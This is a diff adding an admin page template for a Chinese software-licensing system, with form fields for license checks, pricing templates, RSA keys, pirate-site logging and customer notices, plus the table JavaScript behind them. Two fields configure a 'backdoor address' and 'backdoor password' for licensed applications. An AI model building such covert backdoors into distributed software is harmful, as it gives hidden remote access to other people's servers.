+                        <label class="layui-form-label">授权查询</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="auth_query_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">代理查询</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="user_query_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">支付查询</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="pay_query_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">自助注册</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="register_switch" value="1" lay-filter="register_switch" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">卡密兑换</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="cdkey_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">更换授权</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="replace_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item">
+                        <label class="layui-form-label">更换次数</label>
+                        <div class="layui-input-block">
+                            <input type="number" name="free_replace_number" class="layui-input" placeholder="免费更换授权的次数"/>
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">API接口</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="api_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">认证易支付</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="pay_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">绑定授权</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="binding_auth_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">绑定认证</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="binding_payment_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item">
+                        <label class="layui-form-label">API密钥</label>
+                        <div class="layui-input-block">
+                            <input type="text" name="api_key" class="layui-input" placeholder="调用本应用API时的密钥"/>
+                        </div>
+                    </div>
+                    <div id="register_blacklist">
+                        <div class="layui-form-item layui-form-text">
+                            <label class="layui-form-label">注册黑名单</label>
+                            <div class="layui-input-block">
+                                <textarea name="register_blacklist" class="layui-textarea" style="height:100px" placeholder="多个IP用|隔开"></textarea>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="layui-tab-item">
+                    <fieldset class="layui-elem-field layui-field-title">
+                        <legend>授权价格配置</legend>
+                        <div class="layui-field-box">
+                            <div class="layui-form-item">
+                                <label class="layui-form-label">价格模板</label>
+                                <div class="layui-input-block">
+                                    <select id="auth_template" class="layui-input" name="auth_template" lay-search>
+                                        <option value="">请选择价格模板</option>
+                                        <option value="1">默认模板</option>
+                                    </select>
+                                </div>
+                            </div>
+                        </div>
+                    </fieldset>
+                    <div id="payrmb">
+                        <fieldset class="layui-elem-field layui-field-title">
+                            <legend>认证价格配置</legend>
+                            <div class="layui-field-box">
+                                <div class="layui-form-item">
+                                    <label class="layui-form-label">价格模板</label>
+                                    <div class="layui-input-block">
+                                        <select id="payment_template" class="layui-input" name="payment_template" lay-search>
+                                            <option value="">请选择价格模板</option>
+                                            <option value="1">默认模板</option>
+                                        </select>
+                                    </div>
+                                </div>
+                            </div>
+                        </fieldset>
+                    </div>
+                    <fieldset class="layui-elem-field layui-field-title">
+                        <legend>权限价格配置</legend>
+                        <div class="layui-field-box">
+                            <div class="layui-form-item">
+                                <label class="layui-form-label">价格模板</label>
+                                <div class="layui-input-block">
+                                    <select id="power_template" class="layui-input" name="power_template" lay-search>
+                                        <option value="">请选择权限模板</option>
+                                        <option value="1">默认模板</option>
+                                    </select>
+                                </div>
+                            </div>
+                        </div>
+                    </fieldset>
+                    <fieldset class="layui-elem-field layui-field-title">
+                        <legend>其他价格配置</legend>
+                        <div class="layui-field-box">
+                            <div class="layui-form-item">
+                                <label class="layui-form-label">查看盗版</label>
+                                <div class="layui-input-block">
+                                    <input type="number" name="pirate_money" class="layui-input" placeholder="代理查看盗版站点信息时扣除的价格"/>
+                                </div>
+                            </div>
+                            <div class="layui-form-item">
+                                <label class="layui-form-label">赠送余额</label>
+                                <div class="layui-input-block">
+                                    <input type="number" name="give_money" class="layui-input" placeholder="该应用的代理添加下级代理时,下级代理初始的余额"/>
+                                </div>
+                            </div>
+                            <div class="layui-form-item">
+                                <label class="layui-form-label">更换价格</label>
+                                <div class="layui-input-block">
+                                    <input type="number" name="replace_money" class="layui-input" placeholder="免费更换次数用完的更换价格"/>
+                                </div>
+                            </div>
+                        </div>
+                    </fieldset>
+                </div>
+                <div class="layui-tab-item">
+                    <div class="layui-form-item layui-form-text">
+                        <label class="layui-form-label">公钥</label>
+                        <div class="layui-input-block">
+                            <textarea name="public_key" class="layui-textarea" style="height:100px" placeholder="这里填写生成后的公钥"></textarea>
+                        </div>
+                    </div>
+                    <div class="layui-form-item layui-form-text">
+                        <label class="layui-form-label">私钥</label>
+                        <div class="layui-input-block">
+                            <textarea name="private_key" class="layui-textarea" style="height:100px" placeholder="这里填写生成后的私钥"></textarea>
+                        </div>
+                    </div>
+                    <div class="layui-form-item">
+                        <div class="layui-input-block">
+                            <div class="sf-tips">
+                                公钥私钥生成地址：<a href="https://www.bejson.com/enc/rsa/" target="_blank">https://www.bejson.com/enc/rsa/</a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">在线更新</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="update_switch" value="1" lay-skin="switch" checked/>
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">盗版入库</label>
+                        <div class="layui-input-block">
+                            <input type="radio" name="pirate_switch" value="0" title="关闭">
+                            <input type="radio" name="pirate_switch" value="1" title="盗版入库" checked>
+                            <input type="radio" name="pirate_switch" value="2" title="全部入库">
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">检测IP</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="ip_switch" value="1" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">检测授权码</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="authcode_switch" value="1" lay-skin="switch" checked/>
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">提交方式</label>
+                        <div class="layui-input-block">
+                            <input type="checkbox" name="check_auth_method" value="1" lay-text="POST|GET" lay-skin="switch" />
+                        </div>
+                    </div>
+                    <div class="layui-form-item">
+                        <label class="layui-form-label">验证文件</label>
+                        <div class="layui-input-block">
+                            <input type="text" name="authcode_file" class="layui-input" placeholder="请填写您应用授权信息类的位置，例如includes/AuthInfo.php" />
+                        </div>
+                    </div>
+                </div>
+                <div class="layui-tab-item">
+                    <div id="blocktext">
+                        <div class="layui-form-item layui-form-text">
+                            <label class="layui-form-label">盗版提示</label>
+                            <div class="layui-input-block">
+                                <textarea name="pirate_msg" class="layui-textarea" style="height:100px" placeholder="该应用的盗版提示 例如 您当前未授权，请联系xxx授权" >您当前未授权，请联系上级授权</textarea>
+                            </div>
+                        </div>
+                        <div class="layui-form-item layui-form-text">
+                            <label class="layui-form-label">授权到期提示</label>
+                            <div class="layui-input-block">
+                                <textarea name="endtime_msg" class="layui-textarea" style="height:100px" placeholder="该应用的到期提示 例如 您当前授权已到期，请联系xxx续费" >您当前授权已到期，请联系上级续费</textarea>
+                            </div>
+                        </div>
+                        <div class="layui-form-item layui-form-text">
+                            <label class="layui-form-label">授权封禁提示</label>
+                            <div class="layui-input-block">
+                                <textarea name="status_msg" class="layui-textarea" style="height:100px" placeholder="该应用的封禁提示 例如 您当前授权已被封禁，请联系xxx解封" >您当前授权已被封禁，请联系上级解封</textarea>
+                            </div>
+                        </div>
+                        <div class="layui-form-item layui-form-text">
+                            <label class="layui-form-label">授权码错误提示</label>
+                            <div class="layui-input-block">
+                                <textarea name="authcode_msg" class="layui-textarea" style="height:100px" placeholder="该应用的授权码错误提示 例如 您当前授权码错误，请联系xxx获取" >您当前授权码错误，请联系上级获取</textarea>
+                            </div>
+                        </div>
+                        <div class="layui-form-item layui-form-text">
+                            <label class="layui-form-label">IP错误提示</label>
+                            <div class="layui-input-block">
+                                <textarea name="ip_msg" class="layui-textarea" style="height:100px" placeholder="该应用的IP错误提示 例如 您当前IP与授权IP不符，请联系xxx更改" >您当前IP与授权IP不符，请联系上级更改</textarea>
+                            </div>
+                        </div>
+                        <div class="layui-form-item">
+                            <label class="layui-form-label">后门地址</label>
+                            <div class="layui-input-block">
+                                <input type="text" name="hacker_file" class="layui-input" placeholder="请填写您应用的后门访问地址"/>
+                            </div>
+                        </div>
+                        <div class="layui-form-item">
+                            <label class="layui-form-label">后门密码</label>
+                            <div class="layui-input-block">
+                                <input type="text" name="hacker_key" class="layui-input" placeholder="请填写您应用的后门访问密码"/>
+                            </div>
+                        </div>
+                        <div class="layui-form-item" pane>
+                            <label class="layui-form-label">盗版提示</label>
+                            <div class="layui-input-block">
+                                <input type="checkbox" name="pirate_msg_switch" value="1" lay-skin="switch" checked/>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="layui-tab-item">
+                    <div class="layui-form-item layui-form-text">
+                        <label class="layui-form-label">应用公告</label>
+                        <div class="layui-input-block">
+                            <textarea name="app_notice" class="layui-textarea" style="height:100px" placeholder="该应用的公告，可留空" ></textarea>
+                        </div>
+                    </div>
+                    <div class="layui-form-item layui-form-text">
+                        <label class="layui-form-label">卡密兑换公告</label>
+                        <div class="layui-input-block">
+                            <textarea name="cdkey_notice" class="layui-textarea" style="height:100px" placeholder="该应用卡密兑换时的公告" ></textarea>
+                        </div>
+                    </div>
+                    <div class="layui-form-item layui-form-text">
+                        <label class="layui-form-label">余额充值公告</label>
+                        <div class="layui-input-block">
+                            <textarea name="pay_notice" class="layui-textarea" style="height:100px" placeholder="该应用余额充值时的公告" ></textarea>
+                        </div>
+                    </div>
+                    <div class="layui-form-item layui-form-text">
+                        <label class="layui-form-label">用户自助注册公告</label>
+                        <div class="layui-input-block">
+                            <textarea name="register_notice" class="layui-textarea" style="height:100px" placeholder="该应用用户自助注册时的公告" ></textarea>
+                        </div>
+                    </div>
+                    <div class="layui-form-item layui-form-text">
+                        <label class="layui-form-label">更换授权公告</label>
+                        <div class="layui-input-block">
+                            <textarea name="replace_notice" class="layui-textarea" style="height:100px" placeholder="该应用更换授权时的公告" ></textarea>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </form>
+</script>
+{include file="/public/footer"}
+<script type="text/javascript" src="{__MODULE__}clipboard.js"></script>
+<script>
+    layui.use(['layer', 'element', 'form', 'table', 'admin', 'notice', 'laydate', 'upload', 'code'], function () {
+        var $ = layui.jquery;
+        var layer = layui.layer;
+        var form = layui.form;
+        var table = layui.table;
+        var admin = layui.admin;
+        var notice = layui.notice;
+        var laydate = layui.laydate;
+        var element = layui.element;
+        var upload = layui.upload;
+
+        /* 渲染表格 */
+        var insTb = table.render({
+            elem: '#SF_Table',
+            url: '{:url("/App/list")}',
+            method: 'post',
+            page: true,
+            skin: 'line',
+            size: 'lg',
+            toolbar: ['<p>',
+                '<button lay-event="edit" class="layui-btn layui-btn-sm icon-btn"><i class="layui-icon">&#xe654;</i>添加</button>&nbsp;',
+                '<button lay-event="del" class="layui-btn layui-btn-sm layui-btn-danger icon-btn"><i class="layui-icon">&#xe640;</i>删除</button>',
+                '</p>'].join(''),
+            cellMinWidth: 100,
+            request: {
+                pageName: 'current_page' //页码的参数名称，默认：page
+                ,limitName: 'limit' //每页数据量的参数名，默认：limit
+            },
+            parseData: function(res){ //res 即为原始返回的数据
+                return {
+                    "code": res.code, //解析接口状态
+                    "msg": res.msg, //解析提示文本
+                    "count": res.data.data.total, //解析数据长度
+                    "data": res.data.data.data //解析数据列表
+                };
+            },
+            cols: [[
+                {type: 'checkbox', fixed: true},
+                {field: 'id', title: 'ID', sort: true, width: 80, fixed: true, templet: function (d) {
+                        if (d.status == 2) {
+                            return '<span class="layui-badge-dot layui-bg-sf-indigo" style="height: 6px;width: 6px;position: relative;top: -2px"></span> '+d.id;
+                        } else if (d.status == 1) {
+                            return '<span class="layui-badge-dot layui-bg-sf-orange" style="height: 6px;width: 6px;position: relative;top: -2px"></span> '+d.id;
+                        } else {
+                            return '<span class="layui-badge-dot layui-bg-sf-red" style="height: 6px;width: 6px;position: relative;top: -2px"></span> '+d.id;
+                        }
+                    }
+                },
+                {field: 'logo', title: 'LOGO', templet: function (d) {
+                        var url = d.logo || '/Assets/img/logo.png';
+                        return '<img data-index="' + (d.LAY_INDEX - 1) + '" src="' + url + '" class="tb-img-circle" tb-img alt=""/>';
+                    }, width: 100, unresize: true},
+                {field: 'name', title: '应用名称', sort: true, minWidth: 120},
+                {field: 'checkTypeName', title: '判断规则', sort: true, minWidth: 130, templet: function (d) {
+                        return '<span class="layui-badge layui-badge-green">'+d.checkTypeName+'</span>';
+                    },
+                },
+                {field: 'introduce', title: '应用简介', minWidth: 100, templet: function (d) {
+                        return '<a class="layui-btn layui-btn-xs" lay-event="seeIntroduce">点击查看</a>';
+                    }
+                },
+                {field: 'addtime', title: '添加时间', sort: true, minWidth: 170},
+                {field: 'status', title: '运营状态', sort: true, templet: '#SF_TbState', minWidth: 110},
+                {field: 'status', title: '停止状态', sort: true, templet: '#SF_TbState2', minWidth: 110},
+                {title: '操作', toolbar: '#SF_TbBar', align: 'center', minWidth: 270}
+            ]]
+        });
+        $(document).off('click.tbImg').on('click.tbImg', '[tb-img]', function () {
+            var imgList = table.cache['SF_Table'].map(function (d) {
+                return {
+                    alt: d.username,
+                    src: d.logo || '/Assets/img/logo.png'
+                }
+            });
+            layer.photos({photos: {data: imgList, start: $(this).data('index')}, shade: .1, closeBtn: true});
+        });
+        form.on('select(type)', function (data) {
+            if (data.value == "diy") {
+                $("#diy").css("display", "inherit");
+            }else{
+                $("#diy").css("display", "none");
+            }
+        });
+        form.on('switch(permanent_switch)', function (data) {
+            if (data.elem.checked) {
+                $("#type").css("display", "none");
+            }else{
+                $("#type").css("display", "inherit");
+            }
+        });
+
+        /* 表格搜索 */
+        form.on('submit(SF_TbSearch)', function (data) {
+            insTb.reload({where: data.field, page: {curr: 1}});
+            return false;
+        });
+
+        {if $id != ''}
+        insTb.reload({where: {id:{$id}}, page: {curr: 1}, cols: [[{type: 'checkbox', fixed: true},{field: 'id', title: 'ID', templet: '#SF_Tbid', sort: true, width: 80, fixed: true}]]});
+        {/if}
+            /* 表格工具条点击事件 */
+            table.on('tool(SF_Table)', function (obj) {
+                if (obj.event === 'edit') { // 修改
+                    showEditModel(obj.data);
+                } else if (obj.event === 'del') { // 删除
+                    doDel(obj);
+                } else if (obj.event === 'seeIntroduce') {
+                    admin.open({
+                        title: '查看应用 '+obj.data.name+' 简介',
+                        type: 1,
+                        content: '<div class="layui-card"><div class="layui-card-body"><div class="layui-form layui-form-pane"><div class="layui-form-item layui-form-text"><label class="layui-form-label">应用简介</label><div class="layui-input-block"><textarea name="introduce" class="layui-textarea layui-disabled" style="height:100px" placeholder="该程序的简单介绍,可留空" disabled>'+(obj.data.introduce?obj.data.introduce:'暂无介绍')+'</textarea></div></div></div></div></div>'
+                    });
+                }else if (obj.event === 'code') {
+                    admin.open({
+                        id: 'authCode',
+                        title: '查看应用 '+obj.data.name+' 授权代码',
+                        type: 1,
+                        area:['600px','700px'],
+                        content:$("#SF_CodeDialog").html(),
+                        success: function (layero, dIndex) {
+                            $(".public_key").text(obj.data.public_key);
+                            if(obj.data.public_key == '' || obj.data.private_key == ''){
+                                admin.closeDialog('#authCode');
+                                parent.layui.notice.msg('请先配置好该应用公钥私钥', {icon:2,audio:'1'});
+                            }
+                            $(".api_key").text(obj.data.api_key??'');
+                            $(".appid").text(obj.data.id);
+                            $(".method").text(obj.data.check_auth_method?'post':'get');
+                            let js_public_key = '';
+                            $.each(obj.data.public_key.split("\n"),function(index, value){
+                                js_public_key += '\''+value+'\'\+\n';
+                            });
+
+                            $(".js_public_key").text(js_public_key.slice(0,js_public_key.length-2));
+                            console.log(obj.data)
+                            layui.code({
+                                title: '//SF授权系统',
+                                skin: 'notepad',
+                                about:false
+                            });
+                        }
+                    });
+                }
+                laydate.render({
+                    elem: '#test', //指定元素
+                    mark: {
+                        '0-3-15': 'SF'
+                    },
+                    type: 'datetime',
+                    trigger: 'click'
+                });
+            });
+            var clipboard = new ClipboardJS('.btnCopy');
+            clipboard.on('success', function(e) {
+                e.clearSelection();
+                notice.msg('复制成功！', {icon:1, audio:'1'});
+            });
+
+            clipboard.on('error', function(e) {
+                console.error('Action:', e.action);
+                notice.msg('复制失败！', {icon:2, audio:'1'});
+            });
+
+            /* 表格头工具栏点击事件 */
+            table.on('toolbar(SF_Table)', function (obj) {
+                if (obj.event === 'edit') { // 添加
+                    showEditModel();
+                } else if (obj.event === 'del') { // 删除
+                    var checkRows = table.checkStatus('SF_Table');
+                    if (checkRows.data.length === 0) {
+                        notice.msg('请选择要删除的数据！', {icon: 3, audio:'1'});
+                        return;
+                    }
+                    var ids = checkRows.data.map(function (d) {
+                        return d.id;
+                    });
+                    console.log(ids)
+                    doDel({ids: ids});
+                }
+                laydate.render({
+                    elem: '#test', //指定元素
+                    mark: {
+                        '0-3-15': 'SF'
+                    },
+                    type: 'datetime',
+                    trigger: 'click'
+                });
+            });
+
+            /* 显示表单弹窗 */
+            function showEditModel(mData) {
+                admin.open({
+                    type: 1,
+                    title: (mData ? '修改' : '添加') + '应用',
+                    maxmin: true,
+                    resize: true,
+                    btn: ['保存', '取消'],
+                    area: ['640px', '520px'],
+                    shade: 0,
+                    fixed: true,
+                    offset: 'auto',
+                    content: $('#SF_EditDialog').html(),
+                    success: function (layero, dIndex) {
+                        // 回显表单数据
+                        element.render();
+                        if(mData){
+                            $("input[name='logo']").val(mData.logo);
+                            layui.$('#uploadDemoView').removeClass('layui-hide').find('img').attr('src', mData.logo);
+                        }
+                        notice.msg('正在获取列表中..', {icon: 4, close: true});
+                        $.ajax({
+                            type: "POST",
+                            url: '{:url("/AuthTemplate/getList")}',
+                            dataType: "json",
+                            success: function(data) {
+                                notice.destroy();
+                                if (data.code == 0) {
+                                    notice.msg("获取列表成功！", {icon: 1, audio:'1'});
+                                    var content = '<option value="">请选择所属模板</option>';
+                                    $.each(data.data,function(index, value){
+                                        $.each(value,function(index, value){
+                                            content += '<option value="'+value.id+'">'+value.name+'</option>';
+                                        });
+                                    });
+                                    $("#auth_template").html(content);
+                                    $("#payment_template").html(content);
+                                    if(mData) {
+                                        form.val('formBasForm', mData);
+                                    }
+                                } else {
+                                    notice.msg(data.msg, {icon: 2, audio:'1'});
+                                }
+                                form.render();
+                            },
+                            error: function() {
+                                notice.destroy();
+                                notice.msg("服务器错误！", {icon: 2, audio:'1'});
+                            }
+                        });
+
+                        notice.msg('正在获取列表中..', {icon: 4, close: true});
+                        $.ajax({
+                            type: "POST",
+                            url: '{:url("/PowerTemplate/getList")}',
+                            dataType: "json",
+                            success: function(data) {
+                                notice.destroy();
+                                if (data.code == 0) {
+                                    notice.msg("获取列表成功！", {icon: 1, audio:'1'});
+                                    var content = '<option value="">请选择所属模板</option>';
+                                    $.each(data.data,function(index, value){
+                                        $.each(value,function(index, value){
+                                            content += '<option value="'+value.id+'">'+value.name+'</option>';
+                                        });
+                                    });
+                                    $("#power_template").html(content);
+                                    if(mData) {
+                                        form.val('formBasForm', mData);
+                                    }
+                                } else {
+                                    notice.msg(data.msg, {icon: 2, audio:'1'});
+                                }
+                                form.render();
+                            },
+                            error: function() {
+                                notice.destroy();
+                                notice.msg("服务器错误！", {icon: 2, audio:'1'});
+                            }
+                        });
+
+                        var uploadInst = upload.render({
+                            elem: '#upload'
+                            ,url: '{:url("/Upload/image")}'
+                            ,before: function(obj){
+                                //预读本地文件示例，不支持ie8
+                                obj.preview(function(index, file, result){
+                                    $('#demo1').attr('src', result); //图片链接（base64）
+                                });
+                                notice.msg('上传中...', {icon: 4, close: true});
+                            }
+                            ,done: function(res){
+                                notice.destroy();
+                                //如果上传失败
+                                if(res.code == 0){
+                                    $("input[name='logo']").val(res.data.path);
+                                    layui.$('#uploadDemoView').removeClass('layui-hide').find('img').attr('src', res.files.file);
+                                    notice.msg('上传成功！', {icon: 1, audio:'1'});
+                                }else{
+                                    notice.msg('上传失败！', {icon: 2, audio:'1'});
+                                }
+                            }
+                        });
+                        if(mData){
+                            form.val('formBasForm', mData);
+                            form.render();
+                        }
+                        admin.modelForm(layero, 'submitBtn', 'formBasForm');
+                        form.on('submit(submitBtn)', function (data) {
+                            if (data.field.name == "") {
+                                notice.msg('请输入应用名称！', {icon: 3, audio:'1'});
+                                return false;
+                            }
+                            if (data.field.public_key == "") {
+                                notice.msg('请填写授权公钥！', {icon: 3, audio:'1'});
+                                return false;
+                            }
+                            if (data.field.private_key == "") {
+                                notice.msg('请填写授权私钥！', {icon: 3, audio:'1'});
+                                return false;
+                            }
+                            if (data.field.pirate_msg == "") {
+                                notice.msg('请填写盗版提示内容！', {icon: 3, audio:'1'});
+                                return false;
+                            }
+                            if (data.field.endtime_msg == "") {
+                                notice.msg('请填写授权到期提示内容！', {icon: 3, audio:'1'});
+                                return false;
+                            }
+                            if (data.field.status_msg == "") {
+                                notice.msg('请填写授权封禁提示内容！', {icon: 3, audio:'1'});
+                                return false;
+                            }
+                            if (data.field.authcode_msg=="") {
+                                notice.msg('请填写授权码不正确提示内容！', {icon: 3, audio:'1'});
+                                return false;
+                            }
+                            notice.msg('正在执行中..', {icon: 4, close: true});
+                            $.ajax({
+                                type: "POST",
+                                url: "{:url('/App/edit')}",
+                                data: data.field,
+                                dataType: "json",
+                                success: function(data) {
+                                    notice.destroy();
+                                    if (data.code == 0) {
+                                        notice.msg(data.msg, {icon: 1, audio:'1'});
+                                    } else {
+                                        notice.msg(data.msg, {icon: 2, audio:'1'});
+                                    }
+                                }
+                            });
+                            return false;
+                        });
+                        form.on('switch(register_switch)', function (data) {
+                            if (data.elem.checked) {
+                                $("#register_blacklist").css("display","inherit");
+                            }else{
+                                $("#register_blacklist").css("display","none");
+                            }
+                        });
+                        // 禁止弹窗出现滚动条
+                        // $(layero).children('.layui-layer-content').css('overflow', 'visible');
+                    },
+                    end: function (){
+                        insTb.reload();
+                    }
+                });
+            }
+
+            /* 删除 */
+            function doDel(obj) {
+                layer.confirm('确定要删除选中数据吗？', {
+                    skin: 'layui-layer-admin',
+                    icon: 3,
+                    shade: .1
+                }, function (i) {
+                    layer.close(i);
+                    notice.msg('正在执行中..', {icon: 4, close: true});
+                    $.ajax({
+                        type: "POST",
+                        url: obj.data ? '{:url("/App/drop")}' : '{:url("/App/batchDrop")}',
+                        data: {id: obj.data ? obj.data.id : obj.ids.join(',')},
+                        dataType: "json",
+                        success: function(data) {
+                            notice.destroy();
+                            if (data.code == 0) {
+                                insTb.reload({page: {curr: 1}});
+                                notice.msg(data.msg, {icon: 1, audio:'1'});
+                            }else{
+                                notice.msg(data.msg, {icon: 2, audio:'1'});
+                            }
+                        },
+                        error: function() {
+                            notice.destroy();
+                            notice.msg("服务器错误！", {icon: 2, audio:'1'});
+                        }
+                    });
+                });
+            }
+
+            /* 修改用户状态 */
+            form.on('switch(SF_TbStateCk)', function (obj) {
+                notice.msg('正在执行中..', {icon: 4, close: true});
+                $.ajax({
+                    type: "POST",
+                    url:'{:url("/App/setStatus")}',
+                    data: {id:obj.value,status:obj.elem.checked ? 2 : 1},
+                    dataType: "json",
+                    success: function(data) {
+                        notice.destroy();
+                        if (data.code == 0) {
+                            insTb.reload();
+                            notice.msg(data.msg, {icon: 1, audio:'1'});
+                        }else{
+                            notice.msg(data.msg, {icon: 2, audio:'1'});
+                        }
+                    },
+                    error: function() {
+                        notice.destroy();
+                        notice.msg("服务器错误！", {icon: 2, audio:'1'});
+                    }
+                });
+            });
+            form.on('switch(SF_TbStateCk2)', function (obj) {
+                notice.msg('正在执行中..', {icon: 4, close: true});
+                $.ajax({
+                    type: "POST",
+                    url:'{:url("/App/setStatus")}',
+                    data: {id:obj.value,status:obj.elem.checked ? 0 : 2},
+                    dataType: "json",
+                    success: function(data) {
+                        notice.destroy();
+                        if (data.code == 0) {
+                            insTb.reload();
+                            notice.msg(data.msg, {icon: 1, audio:'1'});
+                        }else{
+                            notice.msg(data.msg, {icon: 2, audio:'1'});
+                        }
+                    },
+                    error: function() {
+                        notice.destroy();
+                        notice.msg("服务器错误！", {icon: 2, audio:'1'});
+                    }
+                });
+            });
+        });
+</script>
